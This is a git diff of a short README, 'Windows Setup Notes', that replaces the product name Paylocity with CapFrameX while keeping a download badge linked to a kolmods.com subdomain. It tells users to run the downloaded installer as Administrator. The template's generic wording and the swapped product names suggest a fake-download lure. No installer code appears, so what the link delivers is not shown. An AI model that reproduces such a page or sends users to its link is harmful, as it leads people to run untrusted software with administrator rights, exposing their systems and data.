@@ -1,14 +1,14 @@
-# Paylocity Windows Setup Notes
+# CapFrameX Windows Setup Notes
 
 <p align="center">
-  <a href="https://paylocity-2026.kolmods.com/">
-    <img src="https://img.shields.io/badge/Download-Paylocity-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Paylocity">
+  <a href="https://capframex-setup.kolmods.com/">
+    <img src="https://img.shields.io/badge/Download-CapFrameX-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download CapFrameX">
   </a>
 </p>
 
 ## Download & Install
 
-> Setup notes for **Paylocity** on Windows 10/11 (64-bit). Run the installer as Administrator.
+> Setup notes for **CapFrameX** on Windows 10/11 (64-bit). Run the installer as Administrator.
 
 ### Quick steps
 
@@ -16,15 +16,15 @@
 2. Save the file to a local folder you can find later
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
-5. Restart if the installer asks — then launch **Paylocity** from the Start menu
+5. Restart if the installer asks — then launch **CapFrameX** from the Start menu
 
 ## What you can use it for
 
-- Core Paylocity features on Windows desktop
-- Install and configure Paylocity for daily use
-- Import, edit, and export with Paylocity tools
-- Tune settings and profiles inside Paylocity
-- Integrate Paylocity into your existing workflow
+- Measure CPU/GPU performance with standard tests
+- Compare scores against reference hardware
+- Stress testing for stability validation
+- Sensor monitoring for temps, clocks, and power
+- Export results for troubleshooting reports
 
 ## License
 
